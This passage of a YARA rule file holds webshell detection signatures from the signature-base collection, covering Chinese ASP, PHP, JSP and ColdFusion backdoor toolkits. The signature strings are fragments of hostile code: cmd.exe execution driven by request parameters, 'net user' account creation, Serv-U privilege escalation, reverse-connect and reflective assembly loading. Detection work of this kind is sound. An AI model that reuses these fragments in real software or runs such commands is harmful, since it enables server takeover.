5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_assembly\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"response.write oScriptlhn.exec(\\\"cmd.exe /c\\\" & request(\\\"c\\\")).stdout.readall\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN_PHP_php8\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php8.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php8\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<a href=\\\"http://hi.baidu.com/ca3tie1/home\\\" target=\\\"_blank\\\">Ca3tie1's Blog</a\" ascii\n        $s1 = \"function startfile($path = 'dodo.zip')\" fullword ascii\n        $s3 = \"<form name=\\\"myform\\\" method=\\\"post\\\" action=\\\"\\\">\" fullword ascii\n        $s5 = \"$_REQUEST[zipname] = \\\"dodozip.zip\\\"; \" fullword ascii\n\n    condition:\n        filesize < 25KB and 2 of them\n}\n\nrule Webshell_CN_Tuoku_script_xx\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: xx.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Tuoku_script_xx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"$mysql.=\\\"insert into `$table`($keys) values($vals);\\\\r\\\\n\\\";\" fullword ascii\n        $s2 = \"$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password\" ascii\n        $s16 = \"mysql_query(\\\"SET NAMES gbk\\\");\" fullword ascii\n\n    condition:\n        filesize < 2KB and all of them\n}\n\nrule Webshell_CN_JSPMSSQL\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: JSPMSSQL.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_JSPMSSQL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<form action=\\\"?action=operator&cmd=execute\\\"\" fullword ascii\n        $s2 = \"String sql = request.getParameter(\\\"sqlcmd\\\");\" fullword ascii\n\n    condition:\n        filesize < 35KB and all of them\n}\n\nrule Webshell_CN_Injection_Transit_jmPost\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jmPost.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Injection_Transit_jmPost\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n        $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n\n    condition:\n        filesize < 9KB and all of them\n}\n\nrule Webshell_CN_ASP_web_asp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: web.asp.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_web_asp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<FORM method=post target=_blank>ShellUrl: <INPUT \" fullword ascii\n        $s1 = \"\\\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>\" fullword ascii\n\n    condition:\n        filesize < 13KB and all of them\n}\n\nrule Webshell_CN_wshell_asp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: wshell-asp.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_wshell_asp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"file1.Write(\\\"<%response.clear:execute request(\\\\\\\"root\\\\\\\"):response.End%>\\\");\" fullword ascii\n        $s2 = \"hello word !  \" fullword ascii\n        $s3 = \"root.asp \" fullword ascii\n\n    condition:\n        filesize < 5KB and all of them\n}\n\nrule Webshell_CN_ASP_asp404\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp404.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_asp404\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"temp1 = Len(folderspec) - Len(server.MapPath(\\\"./\\\")) -1\" fullword ascii\n        $s1 = \"<form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"<%= url%>?action=chklogin\\\">\" fullword ascii\n        $s2 = \"<td>&nbsp;<a href=\\\"<%=tempurl+f1.name%>\\\" target=\\\"_blank\\\"><%=f1.name%></a></t\" ascii\n\n    condition:\n        filesize < 113KB and all of them\n}\n\nrule Webshell_CN_Serv_U_asp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Serv-U asp.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Serv_U_asp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n        $s2 = \"<td><input name=\\\"c\\\" type=\\\"text\\\" id=\\\"c\\\" value=\\\"cmd /c net user goldsun lov\" ascii\n        $s3 = \"deldomain = \\\"-DELETEDOMAIN\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\" PortNo=\\\"\" ascii\n\n    condition:\n        filesize < 30KB and 2 of them\n}\n\nrule Webshell_CN_cfm_list\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: list.cfm)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_cfm_list\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<TD><a href=\\\"javascript:ShowFile('#mydirectory.name#')\\\">#mydirectory.name#</a>\" ascii\n        $s2 = \"<TD>#mydirectory.size#</TD>\" fullword ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule Webshell_CN_PHP_php2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php2.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n        $s2 = \"<?php // Black\" fullword ascii\n\n    condition:\n        filesize < 12KB and all of them\n}\n\nrule Webshell_CN_Tuoku_script_oracle\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: oracle.jsp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Tuoku_script_oracle\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"String url=\\\"jdbc:oracle:thin:@localhost:1521:orcl\\\";\" fullword ascii\n        $s2 = \"String user=\\\"oracle_admin\\\";\" fullword ascii\n        $s3 = \"String sql=\\\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\\\";\" fullword ascii\n\n    condition:\n        filesize < 7KB and all of them\n}\n\nrule Webshell_CN_ASPX_aspx4\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx4.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_aspx4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s4 = \"File.Delete(cdir.FullName + \\\"\\\\\\\\test\\\");\" fullword ascii\n        $s5 = \"start<asp:TextBox ID=\\\"Fport_TextBox\\\" runat=\\\"server\\\" Text=\\\"c:\\\\\\\" Width=\\\"60\" ascii\n        $s6 = \"<div>Code By <a href =\\\"http://www.hkmjj.com\\\">Www.hkmjj.Com</a></div>\" fullword ascii\n\n    condition:\n        filesize < 11KB and all of them\n}\n\nrule Webshell_CN_ASPX_aspx\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_aspx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"string iVDT=\\\"-SETUSERSETUP\\\\r\\\\n-IP=0.0.0.0\\\\r\\\\n-PortNo=52521\\\\r\\\\n-User=bin\" ascii\n        $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n        $s2 = \"td.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('urJG','\\\"+dt.Rows[j][\\\"ProcessID\" ascii\n        $s3 = \"vyX.Text+=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('Bin_Regread','\\\"+MVVJ(rootkey)+\" ascii\n\n    condition:\n        filesize < 353KB and 2 of them\n}\n\nrule Webshell_CN_su7_x_9_x\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: su7.x-9.x.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_su7_x_9_x\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"returns=httpopen(\\\"LoginID=\\\"&user&\\\"&FullName=&Password=\\\"&pass&\\\"&ComboPasswor\" ascii\n        $s1 = \"returns=httpopen(\\\"\\\",\\\"POST\\\",\\\"http://127.0.0.1:\\\"&port&\\\"/Admin/XML/User.xml?\" ascii\n\n    condition:\n        filesize < 59KB and all of them\n}\n\nrule Webshell_CN_cfmShell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: cfmShell.cfm)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_cfmShell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n        $s4 = \"<cfif FileExists(\\\"#GetTempDirectory()#foobar.txt\\\") is \\\"Yes\\\">\" fullword ascii\n\n    condition:\n        filesize < 4KB and all of them\n}\n\nrule Webshell_CN_ASP_asp4\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: asp4.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_asp4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n        $s6 = \"Response.Cookies(Cookie_Login) = sPwd\" fullword ascii\n        $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n\n    condition:\n        filesize < 150KB and all of them\n}\n\nrule Webshell_CN_Serv_U_2_admin_by_lake2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Serv-U 2 admin by lake2.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Serv_U_2_admin_by_lake2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"xPost3.Open \\\"POST\\\", \\\"http://127.0.0.1:\\\"& port &\\\"/lake2\\\", True\" fullword ascii\n        $s2 = \"response.write \\\"FTP user lake  pass admin123 :)<br><BR>\\\"\" fullword ascii\n        $s8 = \"<p>Serv-U Local Get SYSTEM Shell with ASP\" fullword ascii\n        $s9 = \"\\\"-HomeDir=c:\\\\\\\\\\\" & vbcrlf & \\\"-LoginMesFile=\\\" & vbcrlf & \\\"-Disable=0\\\" & vb\" ascii\n\n    condition:\n        filesize < 17KB and 2 of them\n}\n\nrule Webshell_CN_PHP_php3\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php3.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"} elseif(@is_resource($f = @popen($cfe,\\\"r\\\"))) {\" fullword ascii\n        $s2 = \"cf('/tmp/.bc',$back_connect);\" fullword ascii\n\n    condition:\n        filesize < 8KB and all of them\n}\n\nrule Webshell_CN_Serv_U_by_Goldsun\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: Serv-U_by_Goldsun.asp)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Serv_U_by_Goldsun\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"b.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & ftpport & \\\"/goldsun/upadmin/s2\\\", True,\" ascii\n        $s2 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n        $s3 = \"127.0.0.1:<%=port%>,\" fullword ascii\n        $s4 = \"GName=\\\"http://\\\" & request.servervariables(\\\"server_name\\\")&\\\":\\\"&request.serve\" ascii\n\n    condition:\n        filesize < 30KB and 2 of them\n}\n\nrule Webshell_CN_PHP_php10\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php10.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php10\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"dumpTable($N,$M,$Hc=false){if($_POST[\\\"format\\\"]!=\\\"sql\\\"){echo\\\"\\\\xef\\\\xbb\\\\xbf\" ascii\n        $s2 = \"';if(DB==\\\"\\\"||!$od){echo\\\"<a href='\\\".h(ME).\\\"sql='\\\".bold(isset($_GET[\\\"sql\\\"]\" ascii\n\n    condition:\n        filesize < 600KB and all of them\n}\n\nrule Webshell_CN_Serv_U_servu\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: servu.php)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Serv_U_servu\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"fputs ($conn_id, \\\"SITE EXEC \\\".$dir.\\\"cmd.exe /c \\\".$cmd.\\\"\\\\r\\\\n\\\");\" fullword ascii\n        $s1 = \"function ftpcmd($ftpport,$user,$password,$dir,$cmd){\" fullword ascii\n\n    condition:\n        filesize < 41KB and all of them\n}\n\nrule Webshell_CN_portRecall_jsp2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jsp2.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_portRecall_jsp2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"final String remoteIP =request.getParameter(\\\"remoteIP\\\");\" fullword ascii\n        $s4 = \"final String localIP = request.getParameter(\\\"localIP\\\");\" fullword ascii\n        $s20 = \"final String localPort = \\\"3390\\\";//request.getParameter(\\\"localPort\\\");\" fullword ascii\n\n    condition:\n        filesize < 23KB and all of them\n}\n\nrule Webshell_CN_ASPX_aspx2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx2.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_aspx2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"if (password.Equals(this.txtPass.Text))\" fullword ascii\n        $s1 = \"<head runat=\\\"server\\\">\" fullword ascii\n        $s2 = \":<asp:TextBox runat=\\\"server\\\" ID=\\\"txtPass\\\" Width=\\\"400px\\\"></asp:TextBox>\" fullword ascii\n        $s3 = \"this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\\\"PATH_INFO\\\"]);\" fullword ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 9KB and all of them\n}\n\nrule Webshell_CN_ASP_hy2006a\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: hy2006a.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASP_hy2006a\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s15 = \"Const myCmdDotExeFile = \\\"command.com\\\"\" fullword ascii\n        $s16 = \"If LCase(appName) = \\\"cmd.exe\\\" And appArgs <> \\\"\\\" Then\" fullword ascii\n\n    condition:\n        filesize < 406KB and all of them\n}\n\nrule Webshell_CN_PHP_php1\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php1.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s7 = \"$sendbuf = \\\"site exec \\\".$_POST[\\\"SUCommand\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n        $s8 = \"elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c\" ascii\n        $s18 = \"echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport\" ascii\n\n    condition:\n        filesize < 621KB and all of them\n}\n\nrule Webshell_CN_jspshell2\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jspshell2.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_jspshell2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s10 = \"if (cmd == null) cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n        $s11 = \"if (program == null) program = \\\"cmd.exe /c net start > \\\"+SHELL_DIR+\\\"/Log.txt\" ascii\n\n    condition:\n        filesize < 424KB and all of them\n}\n\nrule Webshell_CN_Tuoku_script_mysql\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: mysql.aspx)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_Tuoku_script_mysql\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"txtpassword.Attributes.Add(\\\"onkeydown\\\", \\\"SubmitKeyClick('btnLogin');\\\");\" fullword ascii\n        $s2 = \"connString = string.Format(\\\"Host = {0}; UserName = {1}; Password = {2}; Databas\" ascii\n\n    condition:\n        filesize < 202KB and all of them\n}\n\nrule Webshell_CN_PHP_php9\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: php9.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_PHP_php9\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Str[17] = \\\"select shell('c:\\\\windows\\\\system32\\\\cmd.exe /c net user b4che10r ab\" ascii\n\n    condition:\n        filesize < 1087KB and all of them\n}\n\nrule Webshell_CN_portRecall_jsp\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: jsp.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_portRecall_jsp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2\" ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN_ASPX_aspx3\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: aspx3.txt)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_aspx3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Process p1 = Process.Start(\\\"\\\\\\\"\\\" + txtRarPath.Value + \\\"\\\\\\\"\\\", \\\" a -y -k -m\" ascii\n        $s12 = \"if (_Debug) System.Console.WriteLine(\\\"\\\\ninserting filename into CDS:\" ascii\n\n    condition:\n        filesize < 100KB and all of them\n}\n\nrule Webshell_CN_ASPX_shell_shell\n{\n    meta:\n        description = \"Webshell from Chinese toolkit (file: shell.aspx)\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell_ASPX_shell_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook\" ascii\n        $s1 = \"<%@ Page Language=\\\"C#\\\" ValidateRequest=\\\"false\\\" %>\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule Webshell_CN__php1_php7_php9\n{\n    meta:\n        description = \"Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell__php1_php7_php9\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<a href=\\\"?s=h&o=wscript\\\">[WScript.shell]</a> \" fullword ascii\n        $s2 = \"document.getElementById('cmd').value = Str[i];\" fullword ascii\n        $s3 = \"Str[7] = \\\"copy c:\\\\\\\\\\\\\\\\1.php d:\\\\\\\\\\\\\\\\2.php\\\";\" fullword ascii\n\n    condition:\n        filesize < 300KB and all of them\n}\n\nrule Webshell_CN__Serv_U_by_Goldsun_asp3_Serv_U_asp\n{\n    meta:\n        description = \"Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp\"\n        license = \"GPL-3.0 